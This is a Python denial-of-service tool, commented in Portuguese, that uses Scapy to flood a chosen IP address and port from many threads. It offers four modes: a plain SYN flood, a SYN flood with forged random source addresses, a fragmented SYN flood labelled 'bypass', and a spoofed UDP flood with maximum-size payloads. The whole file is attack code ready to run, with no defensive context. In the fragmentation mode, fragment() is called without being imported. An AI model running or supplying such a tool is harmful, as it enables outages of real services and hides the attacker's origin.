import threading
import argparse
from scapy.all import IP, TCP, UDP, send, RandShort
import random
import time

# Constante para Payload Máximo (usado no modo 'stomp')
PAYLOAD_SIZE = 1472
DUMMY_PAYLOAD = random._urandom(PAYLOAD_SIZE)

def random_ip():
    return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))

## Função de Ataque (1): TCP SYN Flood (Padrão)
def tcp_flood_attack(target_ip, target_port):
    while True:
        try:
            ip_layer = IP(dst=target_ip)
            tcp_layer = TCP(sport=RandShort(), dport=target_port, flags="S")
            send(ip_layer / tcp_layer, verbose=0)
        except Exception:
            pass

## Função de Ataque (2): TCP SYN Flood com SPOOFING
def tcp_spoof_attack(target_ip, target_port):
    while True:
        try:
            ip_layer = IP(src=random_ip(), dst=target_ip)
            tcp_layer = TCP(sport=RandShort(), dport=target_port, flags="S")
            send(ip_layer / tcp_layer, verbose=0)
        except Exception:
            pass

## Função de Ataque (3): TCP Bypass (Fragmentação IP)
def tcp_bypass_fragment(target_ip, target_port):
    # Envia o pacote TCP SYN em dois fragmentos IP
    payload = b'A' * 1400 # Payload grande para forçar a fragmentação
    
    while True:
        try:
            ip_layer = IP(dst=target_ip)
            tcp_layer = TCP(sport=RandShort(), dport=target_port, flags="S")
            packet = ip_layer / tcp_layer / payload
            
            # Fragmenta o pacote IP em 2 partes
            # mtu=700 força o pacote de 1500 bytes (aprox) a ser dividido
            fragments = fragment(packet, fragsize=700) 
            
            # Envia os fragmentos
            for frag in fragments:
                send(frag, verbose=0)
                
        except Exception:
            pass

## Função de Ataque (4): STOMP (UDP Flood Payload Máximo)
def stomp_udp_flood(target_ip, target_port):
    while True:
        try:
            ip_layer = IP(src=random_ip(), dst=target_ip)
            udp_layer = UDP(sport=RandShort(), dport=target_port)
            # Payload máximo para o consumo de banda
            send(ip_layer / udp_layer / DUMMY_PAYLOAD, verbose=0) 
        except Exception:
            pass

def main():
    parser = argparse.ArgumentParser(description="Script de Ataque DDoS Combinado")
    parser.add_argument('-ip', required=True, help='Endereço IP do alvo.')
    parser.add_argument('-p', required=True, type=int, help='Porta do alvo.')
    parser.add_argument('-t', required=True, type=int, help='Número de threads.')
    parser.add_argument('-m', '--method', required=True, choices=['tcp', 'spoof', 'bypass', 'stomp'], 
                        help='Método de ataque: tcp (SYN Flood), spoof (SYN Flood c/ Spoof), bypass (Fragmentação), stomp (UDP Payload Max).')
    
    args = parser.parse_args()
    
    target_ip = args.ip
    target_port = args.p
    num_threads = args.t
    attack_method = args.method

    if attack_method == 'tcp':
        attack_func = tcp_flood_attack
    elif attack_method == 'spoof':
        attack_func = tcp_spoof_attack
    elif attack_method == 'bypass':
        attack_func = tcp_bypass_fragment
    elif attack_method == 'stomp':
        attack_func = stomp_udp_flood
    else:
        print("Método inválido.")
        return

    print(f"Iniciando {attack_method.upper()} Attack em {target_ip}:{target_port} com {num_threads} threads...")

    for _ in range(num_threads):
        t = threading.Thread(target=attack_func, args=(target_ip, target_port))
        t.daemon = True 
        t.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nAtaque Interrompido pelo usuário.")
    
    print("Script finalizado.")

if __name__ == '__main__':
    main()